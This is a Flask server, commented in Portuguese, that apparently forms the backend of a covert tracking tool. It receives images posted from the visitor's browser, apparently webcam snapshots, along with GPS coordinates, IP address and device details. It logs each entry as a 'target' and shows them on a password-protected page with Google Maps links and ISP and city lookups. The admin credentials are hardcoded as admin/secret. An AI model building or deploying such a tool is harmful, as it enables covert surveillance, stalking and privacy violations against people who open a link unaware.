from flask import Flask, render_template, request, jsonify, send_from_directory, send_file
import os
import base64
from flask_httpauth import HTTPBasicAuth
from datetime import datetime
from xml.etree.ElementTree import Element, SubElement, tostring, ElementTree
import requests
import geoip2.database

app = Flask(__name__)
auth = HTTPBasicAuth()

# Configurações
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
XML_FILE = 'data.xml'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Autenticação
users = {
    "admin": "secret"
}

if not os.path.exists(XML_FILE):
    root = Element('entries')
    tree = ElementTree(root)
    tree.write(XML_FILE)
    
@auth.get_password
def get_pw(username):
    if username in users:
        return users.get(username)
    return None

# Funções auxiliares
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Carregar a base de dados GeoLite2
reader = geoip2.database.Reader('GeoLite2-City.mmdb')

@app.route('/')
def index():
    print("Target localizado")
    return render_template('index.html')


@app.route('/upload', methods=['POST'])
def upload():
    image_data = request.json.get('image')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    geolocation = request.json.get('geolocation')
    filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}.png"
    filexml = UPLOAD_FOLDER + "/" + filename


    print(filexml)
    with open(filexml, 'wb') as f:
        f.write(base64.b64decode(image_data.split(',')[1]))

    # Save data to XML
    if os.path.exists(XML_FILE):
        tree = ElementTree()
        tree.parse(XML_FILE)
        root = tree.getroot()
    else:
        root = Element('entries')

    entry_elem = SubElement(root, 'entry')
    ip_elem = SubElement(entry_elem, 'ip')
    ip_elem.text = ip_address
    geo_elem = SubElement(entry_elem, 'geolocation')
    geo_elem.text = geolocation
    file_elem = SubElement(entry_elem, 'filename')
    file_elem.text = filename
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    date_time = SubElement(entry_elem, "datetime")
    date_time.text = timestamp
    os_info = request.form.get('os')
    browser_info = request.form.get('browser')
    cpu_info = request.form.get('cpu')

    os_element = SubElement(entry_elem, "os")
    os_element.text = os_info

    browser_element = SubElement(entry_elem, "browser")
    browser_element.text = browser_info

    cpu_element = SubElement(entry_elem, "cpu")
    cpu_element.text = cpu_info
    tree = ElementTree(root)
    tree.write(XML_FILE)

    return jsonify({'status': 'success'})

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        return send_file(file_path, mimetype='image/png')
    else:
        return "Arquivo não encontrado", 404


@app.route('/consulta')
@auth.login_required
def consulta():
    tree = ElementTree()
    tree.parse(XML_FILE)
    data = []
    for entry in tree.findall('entry'):
        ip = entry.find('ip').text
        filename = entry.find('filename').text

        try:
            response = reader.city(ip)
            provider = response.traits.isp or "Desconhecido"
            city = response.city.name or "Desconhecido"
            state = response.subdivisions.most_specific.name or "Desconhecido"
            country = response.country.name or "Desconhecido"
        except:
            provider = "Desconhecido"
            city = "Desconhecido"
            state = "Desconhecido"
            country = "Desconhecido"

        geolocation = entry.find('geolocation').text
        lat, lon = geolocation.split(", ")
        lat = lat.split(": ")[1]
        lon = lon.split(": ")[1]
        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"

        datetime_saved = entry.find('datetime').text

        data.append((filename, google_maps_link, f"{provider}, {city}, {state}, {country}, {ip}", datetime_saved))

    return render_template('consulta.html', data=data)

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(host='0.0.0.0', port=5000)
